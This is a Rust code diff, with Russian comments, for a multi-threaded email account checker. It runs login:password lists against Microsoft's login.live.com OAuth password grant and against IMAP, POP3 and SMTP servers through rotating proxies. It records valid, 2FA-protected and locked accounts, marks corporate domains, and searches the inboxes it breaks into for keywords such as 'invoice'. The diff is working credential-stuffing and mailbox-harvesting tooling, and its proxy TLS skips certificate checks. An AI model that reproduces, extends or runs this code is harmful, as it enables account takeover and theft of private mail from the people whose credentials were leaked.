@@ -4,12 +4,11 @@
 
 use std::collections::HashMap;
 use std::io::{Read, Write};
-use std::net::{TcpStream, ToSocketAddrs};
+use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
 use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
-use std::sync::{Arc, Mutex};
-use std::time::Duration;
-
+use std::sync::{Arc, Condvar, LazyLock, Mutex, RwLock};
+use std::time::{Duration, Instant};
 use base64::Engine;
 use serde::{Deserialize, Serialize};
 use tao::dpi::LogicalSize;
@@ -24,11 +23,64 @@ use wry::WebViewBuilder;
 const PAGE: &str = include_str!("ui.html");
 
 static CANCEL: AtomicBool = AtomicBool::new(false);
+static PAUSED: AtomicBool = AtomicBool::new(false);
+static PAUSE_NOTIFY: (Mutex<bool>, Condvar) = (Mutex::new(false), Condvar::new());
 static BUSY: AtomicBool = AtomicBool::new(false);
 static ROW_ID: AtomicU64 = AtomicU64::new(1);
 static RUN_ID: AtomicU64 = AtomicU64::new(1);
 static PROXY_IX: AtomicUsize = AtomicUsize::new(0);
 
+static DNS_CACHE: LazyLock<RwLock<HashMap<String, (Vec<SocketAddr>, Instant)>>> =
+    LazyLock::new(|| RwLock::new(HashMap::new()));
+static TLS_CONNECTOR: LazyLock<Result<native_tls::TlsConnector, String>> = LazyLock::new(|| {
+    native_tls::TlsConnector::builder()
+        .build()
+        .map_err(|e| format!("ошибка инициализации TLS: {e}"))
+});
+static TLS_CONNECTOR_INSECURE: LazyLock<Result<native_tls::TlsConnector, String>> = LazyLock::new(|| {
+    native_tls::TlsConnector::builder()
+        .danger_accept_invalid_certs(true)
+        .danger_accept_invalid_hostnames(true)
+        .build()
+        .map_err(|e| format!("ошибка TLS прокси: {e}"))
+});
+
+pub fn resolve_dns(host: &str, port: u16) -> Result<Vec<SocketAddr>, (Cat, String)> {
+    let key = format!("{host}:{port}");
+    let now = Instant::now();
+    if let Ok(guard) = DNS_CACHE.read() {
+        if let Some((addrs, ts)) = guard.get(&key) {
+            if now.duration_since(*ts) < Duration::from_secs(600) {
+                return Ok(addrs.clone());
+            }
+        }
+    }
+    let addrs = (host, port)
+        .to_socket_addrs()
+        .map_err(|e| (Cat::ServerNf, format!("ошибка DNS: {e}")))?
+        .collect::<Vec<_>>();
+    if addrs.is_empty() {
+        return Err((Cat::ServerNf, "нет доступных IP-адресов".into()));
+    }
+    if let Ok(mut guard) = DNS_CACHE.write() {
+        guard.insert(key, (addrs.clone(), now));
+    }
+    Ok(addrs)
+}
+
+pub fn get_tls_connector(insecure: bool) -> Result<&'static native_tls::TlsConnector, (Cat, String)> {
+    if insecure {
+        match &*TLS_CONNECTOR_INSECURE {
+            Ok(c) => Ok(c),
+            Err(e) => Err((Cat::Proxy, e.clone())),
+        }
+    } else {
+        match &*TLS_CONNECTOR {
+            Ok(c) => Ok(c),
+            Err(e) => Err((Cat::Tls, e.clone())),
+        }
+    }
+}
 #[derive(Debug)]
 enum WinAction {
     Close,
@@ -200,13 +252,12 @@ pub fn dial(
 ) -> Result<Stream, (Cat, String)> {
     match proxy {
         None => {
-            let addrs = (target_host, target_port)
-                .to_socket_addrs()
-                .map_err(|e| (Cat::ServerNf, format!("ошибка DNS: {e}")))?;
+            let addrs = resolve_dns(target_host, target_port)?;
             let mut last_err = None;
             for addr in addrs {
                 match TcpStream::connect_timeout(&addr, to) {
                     Ok(tcp) => {
+                        let _ = tcp.set_nodelay(true);
                         let _ = tcp.set_read_timeout(Some(to));
                         let _ = tcp.set_write_timeout(Some(to));
                         return Ok(Box::new(tcp));
@@ -226,12 +277,16 @@ pub fn dial(
             Err(last_err.unwrap_or_else(|| (Cat::Connection, "нет доступных адресов".into())))
         }
         Some(p) => {
-            let addrs = (p.host.as_str(), p.port)
-                .to_socket_addrs()
-                .map_err(|e| (Cat::Proxy, format!("ошибка DNS прокси: {e}")))?;
+            let addrs = resolve_dns(&p.host, p.port).map_err(|(cat, e)| {
+                (
+                    if cat == Cat::ServerNf { Cat::Proxy } else { cat },
+                    format!("ошибка DNS прокси: {e}"),
+                )
+            })?;
             let mut connected = None;
             for addr in addrs {
                 if let Ok(tcp) = TcpStream::connect_timeout(&addr, to) {
+                    let _ = tcp.set_nodelay(true);
                     let _ = tcp.set_read_timeout(Some(to));
                     let _ = tcp.set_write_timeout(Some(to));
                     connected = Some(tcp);
@@ -242,11 +297,7 @@ pub fn dial(
                 .ok_or_else(|| (Cat::Proxy, "не удалось подключиться к прокси".into()))?;
 
             let mut base: Stream = if p.kind == ProxyKind::Https {
-                let connector = native_tls::TlsConnector::builder()
-                    .danger_accept_invalid_certs(true)
-                    .danger_accept_invalid_hostnames(true)
-                    .build()
-                    .map_err(|e| (Cat::Proxy, format!("ошибка TLS прокси: {e}")))?;
+                let connector = get_tls_connector(true)?;
                 match connector.connect(&p.host, tcp) {
                     Ok(tls) => Box::new(tls),
                     Err(native_tls::HandshakeError::Failure(e)) => {
@@ -399,9 +450,7 @@ pub fn dial(
 }
 
 pub fn tls_wrap(domain: &str, base: Stream) -> Result<native_tls::TlsStream<Stream>, (Cat, String)> {
-    let connector = native_tls::TlsConnector::builder()
-        .build()
-        .map_err(|e| (Cat::Tls, format!("ошибка инициализации TLS: {e}")))?;
+    let connector = get_tls_connector(false)?;
     match connector.connect(domain, base) {
         Ok(tls) => Ok(tls),
         Err(native_tls::HandshakeError::Failure(e)) => {
@@ -642,6 +691,148 @@ pub fn domain_of(login: &str) -> String {
     login.split('@').nth(1).unwrap_or("").to_lowercase()
 }
 
+pub fn url_encode(s: &str) -> String {
+    let mut out = String::with_capacity(s.len() * 3);
+    for b in s.as_bytes() {
+        match *b {
+            b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
+                out.push(*b as char);
+            }
+            _ => {
+                out.push_str(&format!("%{:02X}", b));
+            }
+        }
+    }
+    out
+}
+
+pub fn is_microsoft_domain(domain: &str) -> bool {
+    let d = domain.to_lowercase();
+    let base = d.trim();
+    let prefixes = [
+        "outlook.", "hotmail.", "live.", "msn.", "passport.", "windowslive.", "office365.",
+    ];
+    for p in prefixes {
+        if base.starts_with(p) {
+            return true;
+        }
+    }
+    matches!(
+        base,
+        "outlook.com"
+            | "hotmail.com"
+            | "live.com"
+            | "msn.com"
+            | "passport.com"
+            | "windowslive.com"
+            | "office365.com"
+    )
+}
+
+pub fn is_microsoft_linked(domain: &str, hosts: &Hosts) -> bool {
+    if is_microsoft_domain(domain) {
+        return true;
+    }
+    let ms_indicators = [
+        "outlook.com",
+        "office365.com",
+        "microsoft.com",
+        "protection.outlook.com",
+        "live.com",
+        "hotmail.com",
+    ];
+    for h in hosts.imap.iter().chain(hosts.pop3.iter()).chain(hosts.smtp.iter()) {
+        let hl = h.to_lowercase();
+        for ind in ms_indicators {
+            if hl.contains(ind) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+pub fn try_microsoft_oauth(
+    a: &Acct,
+    proxy: Option<&Proxy>,
+    to: Duration,
+) -> Result<u32, (Cat, String)> {
+    let host = "login.live.com";
+    let port = 443;
+    let stream = dial(host, port, proxy, to)?;
+    let mut tls = tls_wrap(host, stream)?;
+
+    let client_id = "0000000048093EE0";
+    let scope = "service%3A%3Ahttp%3A%2F%2Fpassport.net%2Fpurpose%3A%3Acompact";
+    let username_enc = url_encode(&a.login);
+    let password_enc = url_encode(&a.pass);
+    let post_body = format!(
+        "client_id={client_id}&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope={scope}&grant_type=password&username={username_enc}&password={password_enc}"
+    );
+
+    let req = format!(
+        "POST /oauth20_token.srf HTTP/1.1\r\n\
+         Host: login.live.com\r\n\
+         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n\
+         Content-Type: application/x-www-form-urlencoded\r\n\
+         Content-Length: {}\r\n\
+         Connection: close\r\n\r\n\
+         {}",
+        post_body.len(),
+        post_body
+    );
+
+    tls.write_all(req.as_bytes())
+        .map_err(|e| (Cat::Connection, format!("ошибка отправки запроса MS OAuth: {e}")))?;
+
+    let mut resp = Vec::new();
+    let mut buf = [0u8; 2048];
+    while let Ok(n) = tls.read(&mut buf) {
+        if n == 0 || resp.len() > 65536 {
+            break;
+        }
+        resp.extend_from_slice(&buf[..n]);
+    }
+    let body = String::from_utf8_lossy(&resp);
+
+    if body.contains("\"access_token\"") || body.contains("access_token=") {
+        return Ok(0);
+    }
+
+    if body.contains("AADSTS50126")
+        || body.contains("AADSTS50034")
+        || body.contains("\"error\":\"invalid_grant\"")
+        || body.contains("Invalid user name or password")
+    {
+        return Err((Cat::Invalid, "неверный логин или пароль (MS OAuth)".into()));
+    }
+    if body.contains("AADSTS50076")
+        || body.contains("AADSTS50079")
+        || body.contains("AADSTS50078")
+        || body.contains("interaction_required")
+        || body.contains("two_step_verification_required")
+    {
+        return Err((Cat::TwoFA, "требуется 2FA подтверждение (MS OAuth)".into()));
+    }
+    if body.contains("AADSTS50053")
+        || body.contains("AADSTS50057")
+        || body.contains("AADSTS53003")
+        || body.contains("account_locked")
+    {
+        return Err((Cat::Locked, "учетная запись заблокирована (MS OAuth)".into()));
+    }
+    if body.contains("AADSTS70002")
+        || body.contains("AADSTS70008")
+        || body.starts_with("HTTP/1.1 429")
+        || body.contains("Rate limit")
+    {
+        return Err((Cat::RateLimited, "превышен лимит запросов MS".into()));
+    }
+
+    let first_line = body.lines().next().unwrap_or("HTTP/1.1 Error");
+    Err((Cat::Protocol, format!("ответ MS OAuth: {first_line}")))
+}
+
 // ---------- КЛАССИФИКАЦИЯ ОШИБОК ----------
 
 pub fn classify(err: &str) -> Cat {
@@ -742,13 +933,15 @@ fn read_smtp(s: &mut impl Read) -> std::io::Result<String> {
     }
 }
 
-pub fn try_imap(
+pub fn try_imap_with_search(
     host: &str,
     port: u16,
     a: &Acct,
     proxy: Option<&Proxy>,
     to: Duration,
-) -> Result<u32, (Cat, String)> {
+    rules: &[SearchRule],
+    search_mode: &str,
+) -> Result<(u32, bool), (Cat, String)> {
     let stream = dial(host, port, proxy, to)?;
     let tls = tls_wrap(host, stream)?;
     let mut client = imap::Client::new(tls);
@@ -760,8 +953,24 @@ pub fn try_imap(
         .map_err(|(e, _)| (classify(&e.to_string()), e.to_string()))?;
     let _ = sess.select("INBOX");
     let unseen = sess.search("UNSEEN").map(|ids| ids.len() as u32).unwrap_or(0);
+    let mut found = false;
+    if !rules.is_empty() {
+        if let Ok(matched) = execute_search_on_imap_session(&mut sess, rules, search_mode) {
+            found = matched;
+        }
+    }
     let _ = sess.logout();
-    Ok(unseen)
+    Ok((unseen, found))
+}
+
+pub fn try_imap(
+    host: &str,
+    port: u16,
+    a: &Acct,
+    proxy: Option<&Proxy>,
+    to: Duration,
+) -> Result<u32, (Cat, String)> {
+    try_imap_with_search(host, port, a, proxy, to, &[], "or").map(|(u, _)| u)
 }
 
 pub fn try_pop3(
@@ -897,15 +1106,83 @@ pub fn opt(b: Option<&[u8]>) -> String {
         .unwrap_or_default()
 }
 
+#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
+pub struct SearchRule {
+    pub field: String,
+    pub term: String,
+}
+
+pub fn execute_search_on_imap_session(
+    sess: &mut imap::Session<native_tls::TlsStream<Stream>>,
+    rules: &[SearchRule],
+    search_mode: &str,
+) -> Result<bool, (Cat, String)> {
+    if rules.is_empty() {
+        return Ok(false);
+    }
+    let _ = sess.select("INBOX");
+    let is_and = search_mode.eq_ignore_ascii_case("and");
+    if is_and {
+        for r in rules {
+            let term = r.term.trim();
+            if term.is_empty() {
+                continue;
+            }
+            let query = build_query(&r.field, term);
+            match sess.search(&query) {
+                Ok(ids) => {
+                    if ids.is_empty() {
+                        return Ok(false);
+                    }
+                }
+                Err(e) => return Err((classify(&e.to_string()), e.to_string())),
+            }
+        }
+        Ok(true)
+    } else {
+        for r in rules {
+            let term = r.term.trim();
+            if term.is_empty() {
+                continue;
+            }
+            let query = build_query(&r.field, term);
+            match sess.search(&query) {
+                Ok(ids) => {
+                    if !ids.is_empty() {
+                        return Ok(true);
+                    }
+                }
+                Err(e) => return Err((classify(&e.to_string()), e.to_string())),
+            }
+        }
+        Ok(false)
+    }
+}
 pub fn build_query(key: &str, term: &str) -> String {
     let charset = if term.is_ascii() { "" } else { "CHARSET UTF-8 " };
     format!("{}{} \"{}\"", charset, key, term.replace('"', "\\\""))
 }
 
 pub fn search_match(a: &Acct, cfg: &RunCfg) -> Result<bool, (Cat, String)> {
+    if cfg.rules.is_empty() && cfg.term.trim().is_empty() {
+        return Ok(false);
+    }
     let domain = domain_of(&a.login);
     let (hosts, _) = discover_hosts(&domain, cfg.use_auto, cfg.auto_timeout, &cfg.auto_cache);
     let mut last_err = (Cat::Connection, "нет IMAP-хостов".into());
+
+    let rules = if !cfg.rules.is_empty() {
+        cfg.rules.clone()
+    } else {
+        vec![SearchRule {
+            field: if cfg.field.is_empty() {
+                "SUBJECT".into()
+            } else {
+                cfg.field.clone()
+            },
+            term: cfg.term.clone(),
+        }]
+    };
 
     for host in hosts.imap {
         let proxy = pick_proxy(cfg);
@@ -935,13 +1212,9 @@ pub fn search_match(a: &Acct, cfg: &RunCfg) -> Result<bool, (Cat, String)> {
                 break;
             }
         };
-        let _ = sess.select("INBOX");
-        let query = build_query(&cfg.field, &cfg.term);
-        let ids = sess
-            .search(&query)
-            .map_err(|e| (classify(&e.to_string()), e.to_string()))?;
+        let res = execute_search_on_imap_session(&mut sess, &rules, &cfg.search_mode);
         let _ = sess.logout();
-        return Ok(!ids.is_empty());
+        return res;
     }
     Err(last_err)
 }
@@ -1082,6 +1355,8 @@ pub struct RunCfg {
     pub retries: u32,
     pub field: String,
     pub term: String,
+    pub rules: Vec<SearchRule>,
+    pub search_mode: String,
     pub use_auto: bool,
     pub auto_learn: bool,
     pub auto_timeout: Duration,
@@ -1140,6 +1415,60 @@ pub fn check_account(id: u64, a: &Acct, cfg: &RunCfg) -> Row {
     let (hosts, is_auto) = discover_hosts(&domain, cfg.use_auto, cfg.auto_timeout, &cfg.auto_cache);
     let mut best_fail: Option<(Cat, String, String, String, String)> = None;
 
+    // 1. Проверка через прямой Microsoft OAuth / ROPS при обнаружении связи с Microsoft
+    if is_microsoft_linked(&domain, &hosts) {
+        let proxy_opt = pick_proxy(cfg);
+        let proxy_str = proxy_opt
+            .as_ref()
+            .map(|p| format!("{}:{}", p.host, p.port))
+            .unwrap_or_default();
+
+        match try_microsoft_oauth(a, proxy_opt.as_ref(), cfg.timeout) {
+            Ok(count) => {
+                let corporate = !is_freemail(&domain);
+                let mut found = false;
+                if !cfg.rules.is_empty() || !cfg.term.trim().is_empty() {
+                    if let Ok(m) = search_match(a, cfg) {
+                        found = m;
+                    }
+                }
+                return Row {
+                    id,
+                    login: a.login.clone(),
+                    protocol: "OUTLOOK".into(),
+                    host: "login.live.com".into(),
+                    country: ctry,
+                    count,
+                    category: "success".into(),
+                    found,
+                    corporate,
+                    auto: is_auto,
+                    proxy: proxy_str,
+                    error: String::new(),
+                };
+            }
+            Err((cat, err)) => {
+                if matches!(cat, Cat::Invalid | Cat::TwoFA | Cat::Locked) {
+                    return Row {
+                        id,
+                        login: a.login.clone(),
+                        protocol: "OUTLOOK".into(),
+                        host: "login.live.com".into(),
+                        country: ctry,
+                        count: 0,
+                        category: cat.key().into(),
+                        found: false,
+                        corporate: !is_freemail(&domain),
+                        auto: is_auto,
+                        proxy: proxy_str,
+                        error: err,
+                    };
+                }
+                best_fail = Some((cat, "OUTLOOK".into(), "login.live.com".into(), proxy_str, err));
+            }
+        }
+    }
+
     let protocols = if cfg.protocols.is_empty() {
         vec!["IMAP".to_string(), "POP3".to_string(), "SMTP".to_string()]
     } else {
@@ -1173,16 +1502,32 @@ pub fn check_account(id: u64, a: &Acct, cfg: &RunCfg) -> Row {
                     .unwrap_or_default();
 
                 let res = match proto.to_uppercase().as_str() {
-                    "IMAP" => try_imap(host, cfg.port_imap, a, proxy_opt.as_ref(), cfg.timeout),
-                    "POP3" => try_pop3(host, cfg.port_pop3, a, proxy_opt.as_ref(), cfg.timeout),
-                    "SMTP" => try_smtp(host, cfg.port_smtp, cfg.port_starttls, a, proxy_opt.as_ref(), cfg.timeout),
+                    "IMAP" => try_imap_with_search(
+                        host,
+                        cfg.port_imap,
+                        a,
+                        proxy_opt.as_ref(),
+                        cfg.timeout,
+                        &cfg.rules,
+                        &cfg.search_mode,
+                    ),
+                    "POP3" => try_pop3(host, cfg.port_pop3, a, proxy_opt.as_ref(), cfg.timeout)
+                        .map(|c| (c, false)),
+                    "SMTP" => try_smtp(
+                        host,
+                        cfg.port_smtp,
+                        cfg.port_starttls,
+                        a,
+                        proxy_opt.as_ref(),
+                        cfg.timeout,
+                    )
+                    .map(|c| (c, false)),
                     _ => continue,
                 };
 
                 match res {
-                    Ok(count) => {
+                    Ok((count, mut found)) => {
                         let corporate = !is_freemail(&domain);
-                        // Кэширование: сохраняем успешный хост первым для этого домена
                         if corporate && cfg.auto_learn {
                             if let Ok(mut c) = cfg.auto_cache.lock() {
                                 let mut cached = hosts.clone();
@@ -1205,12 +1550,12 @@ pub fn check_account(id: u64, a: &Acct, cfg: &RunCfg) -> Row {
                             }
                         }
 
-                        let mut found = false;
-                        if !cfg.term.trim().is_empty() {
+                        if !found && (!cfg.rules.is_empty() || !cfg.term.trim().is_empty()) && proto.to_uppercase() != "IMAP" {
                             if let Ok(m) = search_match(a, cfg) {
                                 found = m;
                             }
                         }
+
                         return Row {
                             id,
                             login: a.login.clone(),
@@ -1310,24 +1655,34 @@ pub fn sanitize(name: &str) -> String {
 
 pub struct Out {
     pub valid: Mutex<std::fs::File>,
+    pub valid_outlook: Mutex<std::fs::File>,
     pub invalid: Mutex<std::fs::File>,
     pub request: Option<Mutex<std::fs::File>>,
 }
 
-pub fn open_out(dir: &Path, term: &str) -> std::io::Result<Out> {
+pub fn open_out(dir: &Path, has_search: bool, term: &str) -> std::io::Result<Out> {
     std::fs::create_dir_all(dir)?;
     let valid = std::fs::OpenOptions::new()
         .create(true)
         .write(true)
         .truncate(true)
         .open(dir.join("valid mails.txt"))?;
+    let valid_outlook = std::fs::OpenOptions::new()
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open(dir.join("valid outlook.txt"))?;
     let invalid = std::fs::OpenOptions::new()
         .create(true)
         .write(true)
         .truncate(true)
         .open(dir.join("invalid mails.txt"))?;
-    let request = if !term.trim().is_empty() {
-        let name = format!("{}mails.txt", sanitize(term));
+    let request = if has_search {
+        let name = if !term.trim().is_empty() {
+            format!("{}mails.txt", sanitize(term))
+        } else {
+            "found_mails.txt".to_string()
+        };
         let f = std::fs::OpenOptions::new()
             .create(true)
             .write(true)
@@ -1340,6 +1695,7 @@ pub fn open_out(dir: &Path, term: &str) -> std::io::Result<Out> {
 
     Ok(Out {
         valid: Mutex::new(valid),
+        valid_outlook: Mutex::new(valid_outlook),
         invalid: Mutex::new(invalid),
         request,
     })
@@ -1365,23 +1721,93 @@ fn run_check(
 
         let _ = proxy_evt.send_event(UserEvent::Eval(format!("window.progress(0, {total});")));
 
+        let (tx, rx) = std::sync::mpsc::channel::<Row>();
+
+        // Фоновый диспетчер UI-батчей: объединяет строки и прогресс для максимальной плавности
+        let proxy_disp = proxy_evt.clone();
+        let done_disp = done.clone();
+        let disp_handle = std::thread::spawn(move || {
+            let mut batch = Vec::with_capacity(64);
+            let mut last_flush = Instant::now();
+            loop {
+                match rx.recv_timeout(Duration::from_millis(40)) {
+                    Ok(row) => {
+                        batch.push(row);
+                        if batch.len() >= 64 || last_flush.elapsed() >= Duration::from_millis(50) {
+                            let d = done_disp.load(Ordering::Relaxed);
+                            if let Ok(json) = serde_json::to_string(&batch) {
+                                let _ = proxy_disp.send_event(UserEvent::Eval(format!(
+                                    "window.pushRowsBatch({json}, {d}, {total});"
+                                )));
+                            }
+                            batch.clear();
+                            last_flush = Instant::now();
+                        }
+                    }
+                    Err(std::sync::mpsc::RecvTimeoutError::Timeout) => {
+                        if !batch.is_empty() {
+                            let d = done_disp.load(Ordering::Relaxed);
+                            if let Ok(json) = serde_json::to_string(&batch) {
+                                let _ = proxy_disp.send_event(UserEvent::Eval(format!(
+                                    "window.pushRowsBatch({json}, {d}, {total});"
+                                )));
+                            }
+                            batch.clear();
+                            last_flush = Instant::now();
+                        }
+                    }
+                    Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => {
+                        if !batch.is_empty() {
+                            let d = done_disp.load(Ordering::Relaxed);
+                            if let Ok(json) = serde_json::to_string(&batch) {
+                                let _ = proxy_disp.send_event(UserEvent::Eval(format!(
+                                    "window.pushRowsBatch({json}, {d}, {total});"
+                                )));
+                            }
+                        }
+                        break;
+                    }
+                }
+            }
+        });
+
         let threads_count = cfg.threads.clamp(1, 500).min(total.max(1));
         let mut handles = Vec::new();
 
         for _ in 0..threads_count {
-            let (accounts, idx, done, cfg, out, proxy_evt) = (
+            let (accounts, idx, done, cfg, out, tx) = (
                 accounts.clone(),
                 idx.clone(),
                 done.clone(),
                 cfg.clone(),
                 out.clone(),
-                proxy_evt.clone(),
+                tx.clone(),
             );
 
             handles.push(std::thread::spawn(move || loop {
                 if CANCEL.load(Ordering::Relaxed) || RUN_ID.load(Ordering::Relaxed) != run_id {
                     break;
                 }
+
+                // Синхронизация паузы: нулевая нагрузка на CPU в режиме ожидания
+                if PAUSED.load(Ordering::Relaxed) {
+                    if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
+                        while *lock
+                            && !CANCEL.load(Ordering::Relaxed)
+                            && RUN_ID.load(Ordering::Relaxed) == run_id
+                        {
+                            lock = match PAUSE_NOTIFY.1.wait(lock) {
+                                Ok(l) => l,
+                                Err(p) => p.into_inner(),
+                            };
+                        }
+                    }
+                }
+
+                if CANCEL.load(Ordering::Relaxed) || RUN_ID.load(Ordering::Relaxed) != run_id {
+                    break;
+                }
+
                 let i = idx.fetch_add(1, Ordering::SeqCst);
                 if i >= accounts.len() {
                     break;
@@ -1401,6 +1827,11 @@ fn run_check(
                         if let Ok(mut f) = o.valid.lock() {
                             let _ = f.write_all(line.as_bytes());
                         }
+                        if row.protocol == "OUTLOOK" || is_microsoft_domain(&domain_of(&acct.login)) {
+                            if let Ok(mut f) = o.valid_outlook.lock() {
+                                let _ = f.write_all(line.as_bytes());
+                            }
+                        }
                         if row.found {
                             if let Some(req_file) = &o.request {
                                 if let Ok(mut f) = req_file.lock() {
@@ -1413,19 +1844,18 @@ fn run_check(
                     }
                 }
 
-                if let Ok(json) = serde_json::to_string(&row) {
-                    let _ = proxy_evt.send_event(UserEvent::Eval(format!("window.pushRow({json});")));
-                }
-
-                let d = done.fetch_add(1, Ordering::SeqCst) + 1;
-                let _ = proxy_evt
-                    .send_event(UserEvent::Eval(format!("window.progress({d}, {total});")));
+                done.fetch_add(1, Ordering::SeqCst);
+                let _ = tx.send(row);
             }));
         }
+
+        drop(tx);
 
         for h in handles {
             let _ = h.join();
         }
+
+        let _ = disp_handle.join();
 
         if RUN_ID.load(Ordering::SeqCst) == run_id {
             BUSY.store(false, Ordering::SeqCst);
@@ -1473,6 +1903,10 @@ struct In {
     #[serde(default)]
     term: String,
     #[serde(default)]
+    rules: Vec<SearchRule>,
+    #[serde(default = "default_search_mode", alias = "search_mode")]
+    search_mode: String,
+    #[serde(default)]
     action: String,
     #[serde(default)]
     id: u64,
@@ -1491,6 +1925,7 @@ fn default_pop3_port() -> u16 { 995 }
 fn default_smtp_port() -> u16 { 465 }
 fn default_starttls_port() -> u16 { 587 }
 fn default_auto_timeout() -> u64 { 1600 }
+fn default_search_mode() -> String { "or".to_string() }
 
 fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
     let msg: In = match serde_json::from_str(&body) {
@@ -1501,6 +1936,10 @@ fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
     match msg.cmd.as_str() {
         "start" => {
             CANCEL.store(false, Ordering::SeqCst);
+            PAUSED.store(false, Ordering::SeqCst);
+            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
+                *lock = false;
+            }
             let run_id = RUN_ID.fetch_add(1, Ordering::SeqCst) + 1;
             BUSY.store(true, Ordering::SeqCst);
 
@@ -1537,6 +1976,15 @@ fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
             };
 
             let auto_timeout = Duration::from_millis(if msg.auto_timeout == 0 { 1600 } else { msg.auto_timeout });
+
+            let mut rules = msg.rules;
+            if rules.is_empty() && !msg.term.trim().is_empty() {
+                rules.push(SearchRule {
+                    field: field.clone(),
+                    term: msg.term.clone(),
+                });
+            }
+
             let cfg = RunCfg {
                 threads,
                 protocols: msg.protocols,
@@ -1546,6 +1994,8 @@ fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
                 retries,
                 field,
                 term: msg.term.clone(),
+                rules,
+                search_mode: if msg.search_mode.is_empty() { "or".to_string() } else { msg.search_mode },
                 use_auto: msg.use_auto,
                 auto_learn: msg.auto_learn,
                 auto_timeout,
@@ -1566,7 +2016,8 @@ fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
                 .and_then(|p| p.parent().map(|d| d.join(&dir_name)))
                 .unwrap_or_else(|| PathBuf::from(&dir_name));
 
-            let out_arc = match open_out(&out_dir, &msg.term) {
+            let has_search = !cfg.rules.is_empty() || !cfg.term.trim().is_empty();
+            let out_arc = match open_out(&out_dir, has_search, &msg.term) {
                 Ok(out) => {
                     let path_str = out_dir.to_string_lossy().replace('\\', "/");
                     let _ =
@@ -1582,8 +2033,26 @@ fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
 
             run_check(run_id, accounts, cfg, out_arc, proxy);
         }
+        "pause" => {
+            PAUSED.store(true, Ordering::SeqCst);
+            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
+                *lock = true;
+            }
+        }
+        "resume" => {
+            PAUSED.store(false, Ordering::SeqCst);
+            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
+                *lock = false;
+            }
+            PAUSE_NOTIFY.1.notify_all();
+        }
         "stop" => {
+            PAUSED.store(false, Ordering::SeqCst);
             CANCEL.store(true, Ordering::SeqCst);
+            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
+                *lock = false;
+            }
+            PAUSE_NOTIFY.1.notify_all();
             RUN_ID.fetch_add(1, Ordering::SeqCst);
             BUSY.store(false, Ordering::SeqCst);
             let _ = proxy.send_event(UserEvent::Eval("window.finish();".into()));
@@ -1624,6 +2093,8 @@ fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
                 retries: 0,
                 field: msg.field.clone(),
                 term: msg.term.clone(),
+                rules: vec![],
+                search_mode: "or".to_string(),
                 use_auto: true,
                 auto_learn: true,
                 auto_timeout: Duration::from_millis(1600),
@@ -1845,6 +2316,50 @@ mod tests {
         assert!(is_auto);
         assert!(hosts.imap.contains(&"imap.custom-company.de".to_string()));
     }
+
+    #[test]
+    fn microsoft_domain_and_linked_detection() {
+        assert!(is_microsoft_domain("outlook.com"));
+        assert!(is_microsoft_domain("hotmail.com"));
+        assert!(is_microsoft_domain("live.ru"));
+        assert!(is_microsoft_domain("msn.com"));
+        assert!(is_microsoft_domain("outlook.fr"));
+        assert!(is_microsoft_domain("office365.com"));
+        assert!(!is_microsoft_domain("gmail.com"));
+        assert!(!is_microsoft_domain("yandex.ru"));
+
+        let hosts = Hosts {
+            imap: vec!["outlook.office365.com".into()],
+            pop3: vec![],
+            smtp: vec!["smtp.office365.com".into()],
+        };
+        assert!(is_microsoft_linked("custom-corp.com", &hosts));
+
+        let non_ms_hosts = Hosts {
+            imap: vec!["imap.custom.com".into()],
+            pop3: vec!["pop.custom.com".into()],
+            smtp: vec!["smtp.custom.com".into()],
+        };
+        assert!(!is_microsoft_linked("custom.com", &non_ms_hosts));
+    }
+
+    #[test]
+    fn url_encode_special_chars() {
+        assert_eq!(url_encode("test@outlook.com"), "test%40outlook.com");
+        assert_eq!(url_encode("p@$$w0rd!#"), "p%40%24%24w0rd%21%23");
+        assert_eq!(url_encode("simple-user_1.0~"), "simple-user_1.0~");
+    }
+
+    #[test]
+    fn search_rule_structure() {
+        let rule = SearchRule {
+            field: "SUBJECT".into(),
+            term: "invoice".into(),
+        };
+        let json = serde_json::to_string(&rule).unwrap();
+        let deserialized: SearchRule = serde_json::from_str(&json).unwrap();
+        assert_eq!(rule, deserialized);
+    }
     // Сетевой тест: реально ходит в gmail. Запуск: `cargo test -- --ignored`.
     #[test]
     #[ignore]
@@ -1862,6 +2377,8 @@ mod tests {
             retries: 0,
             field: "SUBJECT".into(),
             term: "".into(),
+            rules: vec![],
+            search_mode: "or".to_string(),
             use_auto: true,
             auto_learn: true,
             auto_timeout: Duration::from_millis(1600),
